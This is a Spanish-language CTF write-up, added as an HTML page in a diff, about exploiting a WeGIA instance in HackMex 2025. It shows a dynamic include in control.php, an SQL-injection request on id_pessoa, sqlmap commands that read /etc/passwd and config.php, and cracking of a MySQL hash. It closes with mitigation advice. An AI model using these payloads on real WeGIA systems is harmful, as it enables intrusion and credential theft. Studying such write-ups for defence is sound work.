@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeGIA CTF Writeup: LFI + SQL Injection - HackMex 2025</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+
+        /* Declaración de tu fuente personalizada */
+        @font-face {
+            font-family: 'Fraktur';
+            src: url('/fonts/fraktur-regular.woff2') format('woff2'),
+                 url('/fonts/fraktur-regular.woff') format('woff');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+        @font-face {
+            font-family: 'Century Gothic';
+            src: url('../fonts/century-gothic.woff') format('woff');
+            font-weight: normal; /* O 400 */
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Century Gothic Bold';
+            src: url('../fonts/century-gothic-bold.woff') format('woff');
+            font-weight: bold;
+            font-style: normal;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            color: #ffffff;
+            background-color: #000000;
+            min-height: 100vh;
+        }
+
+        .header {
+            background-color: #000000;
+            border-bottom: 1px solid #333333;
+            padding: 1rem 0;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-family: 'Fraktur', 'JetBrains Mono', monospace;
+            font-size: 2rem;
+            font-weight: 700;
+            color: #ffffff;
+            text-decoration: none;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .post-header {
+            text-align: center;
+            margin-bottom: 3rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid #333333;
+        }
+
+        .post-title {
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: #ff0000;
+        }
+
+        .post-meta {
+            color: #cccccc;
+            font-size: 1rem;
+        }
+
+        .post-meta a {
+            font-family: 'Century Gothic', 'JetBrains Mono', monospace;
+            color: #ff0000;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+        }
+
+        .post-meta a:hover {
+            font-family: 'Century Gothic', 'JetBrains Mono', monospace;
+            border-bottom: 1px solid #ff0000;
+        }
+
+        .post-content {
+            font-size: 1.1rem;
+            line-height: 1.8;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            margin: 2.5rem 0 1.5rem 0;
+            color: #ff0000;
+            font-weight: 600;
+        }
+
+        h3 {
+            font-size: 1.4rem;
+            margin: 2rem 0 1rem 0;
+            color: #ff0000;
+            font-weight: 500;
+        }
+
+        p {
+            margin-bottom: 1.5rem;
+            color: #ffffff;
+        }
+
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            padding: 0.2rem 0.4rem;
+            border-radius: 0.25rem;
+            font-size: 0.9em;
+        }
+
+        pre {
+            background-color: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            color: #ffffff;
+            font-size: 0.95em;
+        }
+
+        blockquote {
+            border-left: 4px solid #ff0000;
+            background-color: #1a1a1a;
+            margin: 2rem 0;
+            padding: 1.5rem;
+            border-radius: 0.5rem;
+            color: #ffffff;
+        }
+
+        ul, ol {
+            margin-left: 2rem;
+            margin-bottom: 1.5rem;
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+            color: #ffffff;
+        }
+
+        strong {
+            color: #ff0000;
+            font-weight: 600;
+        }
+
+        .info-box {
+            background-color: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .info-box h4 {
+            color: #ff0000;
+            margin-bottom: 1rem;
+            font-size: 1.1rem;
+        }
+
+        hr {
+            border: none;
+            height: 1px;
+            background-color: #333333;
+            margin: 3rem 0;
+        }
+
+        .footer {
+            font-family: 'Century Gothic Bold', 'JetBrains Mono', monospace;
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid #333333;
+            color: #cccccc;
+        }
+
+        /* Estilos para imágenes */
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 2rem auto;
+            border-radius: 0.5rem;
+            border: 1px solid #333333;
+        }
+
+        /* Imagen del header más pequeña */
+        .post-header + img {
+            max-width: 60%;
+            margin: 1.5rem auto 2rem auto;
+            opacity: 0.9;
+            transition: opacity 0.3s ease;
+        }
+
+        .post-header + img:hover {
+            opacity: 1;
+        }
+
+        /* Para imágenes dentro del contenido */
+        .post-content img {
+            max-width: 80%;
+            margin: 1.5rem auto;
+            box-shadow: 0 4px 12px rgba(255, 0, 0, 0.1);
+        }
+
+        /* Syntax highlighting simple */
+        .php { color: #ff6b6b; }
+        .sql { color: #4ecdc4; }
+        .bash { color: #ffe66d; }
+        .http { color: #a8e6cf; }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+
+            .post-title {
+                font-size: 1.8rem;
+            }
+
+            pre {
+                padding: 1rem;
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Artículos</h1>
+    </div>
+    
+    <div class="container">
+        <article class="post">
+            <header class="post-header">
+                <h1 class="post-title">(LFI + SQLi) 2 /etc/passwd</h1>
+                <p class="post-meta">
+                    Agosto 2025 • 
+                    <a href="#reconocimiento">Reconocimiento</a> • 
+                    <a href="#enumeración">Enumeración</a> • 
+                    <a href="#explotación">Explotación</a> •
+                    <a href="#mitigación">Mitigación</a>
+                </p>
+            </header>
+            <img src="/articulos/img/wedgie.png"/>
+            <div class="post-content">
+                <p>A finales de agosto de este 2025, se llevó a cabo la ronda de clasificación del Octavo HackMex un CTF organizado por el IPN. En esta ocasión hablaremos de una forma de compromiso que indirectamente obtiene un par de las cientas de flags de los desafíos disponibles.</p>
+
+                <h2>Resumen</h2>
+
+                <p>La máquina objetivo consistió en una implementación en el puerto 80 del sistema <strong>WeGIA</strong> (Web Gerenciador para Instituições Assistenciais) un software libre creado para la gestión de instituciones del tercer sector (ni públicas ni privadas) en Brasil.</p>
+
+                <p>Partiendo de un escaneo inicial (dirsearch), análisis del frontend comprometido y del repositorio público, se descubrió que el endpoint <code>controle/control.php</code> aceptaba parámetros que permitían inclusión dinámica de archivos y el paso directo de parámetros a controladoras/DAO.</p>
+
+                <p>Lo anterior derivó en una combinación de <strong>LFI (insecure include)</strong> y <strong>SQL Injection</strong> en distintos parámetros, lo que permitió leer archivos sensibles.</p>
+
+                <h2>Antecedentes</h2>
+
+                <p><strong>DAO:</strong> En una aplicación web se necesitan realizar acciones como: conexiones a la BD, ejecutar consultas, mapear resultados a objetos de la aplicación, en general que la lógica de acceso a los datos evite que cualquier parte del código no llame a SQL directamente.</p>
+
+                <p>DAO (Data Access Object) como patrón de diseño se encarga de esto, encapsulando el acceso a la BD. En WeGIA hay ficheros <code>DAO.php</code> como <code>FuncionarioDAO.php</code> que contiene las consultas SQL.</p>
+
+                <p>La maldad está en que los DAO concatenen directamente parámetros recibidos <code>$_REQUEST</code> en SQL sin sanitizar.</p>
+
+                <h2>Objetivo</h2>
+
+                <p>Resumir una metodología útil para esta y cualquier otra explotación, a través de particularidades técnicas que pueden estar presentes en algún otro sistema.</p>
+
+                <h2 id="reconocimiento">Reconocimiento</h2>
+
+                <p>Inicialmente se tuvieron hallazgos como <code>.gitignore</code>, rutas como <code>config.php</code>, <code>html/apoio/view/teste.php</code>, directorios <code>pdfs/</code>, <code>BD/.idea/</code>.</p>
+
+                <p>El login en el frontend, una variable <code>erro</code> gestiona un error de credenciales incorrectas y que con la variable <code>#login</code> aplica una máscara CPF (formato de numérico de Brasil). Pero que no impide probar payloads arbitrarios por POST/GET.</p>
+
+                <pre><code class="php">$("#login").keypress(function(event) {
+    const isNumber=/^[0-9]$/i.test(event.key);
+    if(isNumber)
+        $("#login").mask("000.000.000-00");
+    else
+        $("#login").unmask();
+});</code></pre>
+
+                <p>Además de directorios descubiertos por salidas usuales, un fragmento de salida de DirSearch nos dio pista para un vector de ataque:</p>
+
+                <pre><code>[22:43:33] 302 - 174KB - /html/profile.php -> ../controle/control.php?metodo=listarUm&nomeClasse=FuncionarioControle&nextPage=../html/profile_funcionario.php?cpf=&cpf=</code></pre>
+
+                <div class="info-box">
+                    <h4>Información obtenida por reconocimiento:</h4>
+                    <ul>
+                        <li>Vulnerable a credenciales por defecto: <code>admin:password</code></li>
+                        <li>Implementa una aplicación al parecer vulnerable: github.com/LabRedesCefetRJ/WeGIA</li>
+                        <li>PHP con base de datos MySQL/MariaDB, Nginx 1.22.1</li>
+                        <li>Una vulnerabilidad de inclusión de archivos enumerado con DirSearch</li>
+                    </ul>
+                </div>
+
+                <h2 id="enumeración">Enumeración</h2>
+
+                <p>WeGIA es un sistema de gestión con múltiples vulnerabilidades documentadas:</p>
+                <ul>
+                    <li><strong>117 avisos de seguridad</strong> en el repositorio oficial</li>
+                    <li>Historial de vulnerabilidades de inyección SQL</li>
+                    <li>Problemas de validación de entrada</li>
+                    <li>Controles de acceso inadecuados</li>
+                </ul>
+
+                <p>Cuando se hicieron pruebas a <code>nomeClasse=AdminControle</code> aparecieron errores de <code>include_once(AdminControle.php): Failed to open stream...</code></p>
+
+                <p>Algo que es <strong>evidencia directa</strong> de inclusión dinámica (<code>include_once($nomeClasse . '.php')</code>).</p>
+
+                <p>En Burp Repeater se notaba la sensibilidad del parámetro <code>situacao</code> (error <code>Undefined array key "situacao"</code> al insertar <code>'</code>) y otros parámetros que terminan en queries.</p>
+
+                <h3>Análisis de vulnerabilidad</h3>
+
+                <p>Revisando el repositorio público validamos que <code>control.php</code> carga controladoras dinámicamente a partir del parámetro <code>nomeClasse</code> (lista blanca en el repo, pero con uso directo de parámetros hacia DAO/queries).</p>
+
+                <p>Es decir, en el código hay un bloque que construye una ruta a partir del parámetro <code>nomeClasse</code>, exige que exista el fichero y luego lo <code>require_once</code> y crea la clase con ese nombre:</p>
+
+                <pre><code class="php">$pathRequire = '';
+
+if ($modulo) {
+    $pathRequire = $modulo . DIRECTORY_SEPARATOR;
+}
+
+$pathRequire .= $nomeClasse . ".php";
+
+if (!file_exists($pathRequire)) {
+    throw new InvalidArgumentException('O arquivo para requisição da classe não existe.', 400);
+}
+
+require_once($pathRequire);
+
+if (!class_exists($nomeClasse)) {
+    throw new InvalidArgumentException('A classe informada não existe no sistema.', 400);
+}
+
+// Crea una instancia de la clase y chama el método
+$objeto = new $nomeClasse();
+
+if (!method_exists($objeto, $metodo)) {
+    throw new InvalidArgumentException('O método informado não existe na classe.', 400);
+}
+
+$objeto->$metodo();</code></pre>
+
+                <p>En este reporte se denomina <strong>inclusión dinámica</strong> porque el valor de <code>$nomeClasse</code> viene de <code>$_REQUEST</code> y se concatena para formar la ruta y el nombre de la clase.</p>
+
+                <p>Así fácilmente, con cualquier input se puede incluir e instanciar el archivo y la clase de tu agrado.</p>
+
+                <p>Posterior a esta validación, se buscó una explotación viable. Se procedió casi de prueba y error con el repeater para un request útil, hasta se volvió a revisar el código.</p>
+
+                <p>Haciendo esto y obteniendo distintas respuestas de las peticiones, se encontró algo interesante:</p>
+
+                <pre><code class="php">public function verificarSenha()
+{
+    extract($_REQUEST);
+    $nova_senha = hash('sha256', $nova_senha);
+    $confirmar_senha = hash('sha256', $confirmar_senha);
+    $senha_antiga = hash('sha256', $senha_antiga);
+    if ($nova_senha != $confirmar_senha) {
+        return 1;
+    } else {
+        $mysqli = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+        $senha = $mysqli->query("SELECT senha FROM pessoa where id_pessoa=" . $id_pessoa);
+        while ($row = $senha->fetch_array(MYSQLI_NUM)) {
+            if ($row[0] != $senha_antiga) {
+                return 2;
+            }
+        }
+    }
+    return 3;
+}</code></pre>
+
+                <p>Aquí se pudo ver que <code>$id_pessoa</code> viene de <code>extract($_REQUEST);</code> osea viene del input que le damos y se concatena <strong>sin validación ni escape</strong>.</p>
+
+                <p>Si se le manda <code>id_pessoa=1'</code> o cualquier payload que cierre/comente la query, se quiebra la sintaxis SQL.</p>
+
+                <p>Se hizo la prueba en Burp para poder sacar foto y demostrar que no es fake:</p>
+
+                <pre><code class="http">GET /controle/control.php?nomeClasse=FuncionarioControle&metodo=verificarSenha&id_pessoa=1'&nova_senha=test&confirmar_senha=test&senha_antiga=test
+
+: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in /var/www/html/controle/FuncionarioControle.php</code></pre>
+
+                <h3>Construcción del archivo de request</h3>
+
+                <p>En un archivo <code>req.txt</code> se reflejó la petición <strong>normal</strong> de Burp, el asunto consistió en que el GET sea el efectivo:</p>
+
+                <pre><code class="http">GET /controle/control.php?nomeClasse=FuncionarioControle&metodo=verificarSenha&id_pessoa=1&nova_senha=test&confirmar_senha=test&senha_antiga=test HTTP/1.1
+Host: wedgie.echocity-f.com
+Connection: close
+User-Agent: curl/8.13.0
+Accept: */*
+Cookie: PHPSESSID=8mcget7ue06p7f70hffn4qpb1t</code></pre>
+
+                <p>Dado el contexto (un CTF muy grande), se decidió proseguir el ataque con <code>sqlmap</code> usando opciones para leer archivos del filesystem, <code>--file-read</code>/<code>LOAD_FILE()</code>.</p>
+
+                <p>Es necesario aclarar que la petición es la limpia, la que no rompe la sintaxis, porque será la base para que sqlmap inyecte sistemáticamente en el parámetro objetivo, es decir, usamos la referencia, porque con la comilla solo confirmamos la vulnerabilidad.</p>
+
+                <h2 id="explotación">Explotación</h2>
+
+                <p>El comando empleado para la detección y enumeración:</p>
+
+                <pre><code class="bash">sqlmap -r req.txt -p id_pessoa --risk=3 --level=5 --dbs --batch --dbms=mysql --threads=1</code></pre>
+
+                <p>Teniendo una inyección exitosa, y con acceso a los archivos, se consultó un archivo crítico: <code>/var/www/html/config.php</code>, el cual mostró:</p>
+
+                <pre><code class="sql">define('DB_NAME','wegia');
+define('DB_USER','wegiauser');
+define('DB_PASSWORD','senha');
+define('DB_HOST','localhost');
+BKP_DIR: /var/www/bkpWeGIA</code></pre>
+
+                <p>De hecho la contraseña la podíamos validar porque se consiguió un hash como el siguiente: <code>AD77F56D2FD78299B87609DCC0423260B5AADB03</code> el cual corresponde a <strong>MySQL native password</strong> es decir que las técnicas podrían ser las siguientes:</p>
+
+                <ul>
+                    <li>Al formato John: <code>user:$mysql-sha1$&lt;HEX&gt;</code></li>
+                    <li>Con Hashcat modo <code>-m 300</code> (MySQL4.1/MySQL5) o John con <code>--format=mysql-sha1</code></li>
+                </ul>
+
+                <p>El cual tuvo un resultado exitoso, dando esa contraseña en texto plano: <code>senha</code> (contraseña en portugués)</p>
+
+                <p>Además de este acceso, comprobamos obtener archivos del sistema y de hecho en el archivo <code>/etc/passwd</code> venía la flag en la que ronda este pequeño reporte.</p>
+
+                <pre><code class="bash">sqlmap -r req.txt --file-read="/etc/passwd"</code></pre>
+
+                <h2 id="mitigación">Mitigación</h2>
+
+                <p>Dada la forma de como empezó el ataque (file inclusion) se debería sanitizar las entradas, en este caso no pasar directamente lo de <code>$_REQUEST</code> a includes y/o queries. Es decir, hacer más estrictas las listas blancas y la validación de tipos y longitudes de datos de entrada.</p>
+
+                <p>Derivado de lo anterior se tendría que evitar la inclusión dinámica y archivos basados en input.</p>
+
+                <p>Restringir los permisos del usuario DB, esto dado que se logró acceder a archivos sensibles. Sería una gran oportunidad para aplicar el principio del menor privilegio (quitar privilegios innecesarios).</p>
+
+                <h2>Conclusión</h2>
+
+                <p>A través de reconocimiento, revisión de código y pruebas manuales que confirmaban presencia y explotabilidad.</p>
+
+                <p>El vector principal fue la inclusión dinámica en <code>control.php</code> y falta de saneamiento en los DAO's. Teniendo como resultado la extracción de <code>config.php</code> y <code>/etc/passwd</code> permitió obtener información y rutas críticas que, si se explotaran en un entorno real, representarían un compromiso grave.</p>
+
+                <p>Con un reconocimiento inicial en el código fuente y en el robots.txt, comenzó el crawling y enumeración de la whitelist.</p>
+
+                <p>El LFI no era esencial, pero fue lo que ayudó a continuar, no solo para tener un mapeo provechoso, sino que aceleró la explotación tomándolo como una herramienta interactiva y para que después sea un vector complementario con SQLi.</p>
+
+                <p>¿Qué otra explotación harías?</p>
+                <hr>
+
+                <div class="footer">
+                    <p>Escrito por <strong>kmxbay</strong></p>
+                    <p>Agradecimiento especial a los fans de pepe madero</p>
+                </div>
+            </div>
+        </article> 
+    </div>
+</body>
+</html>
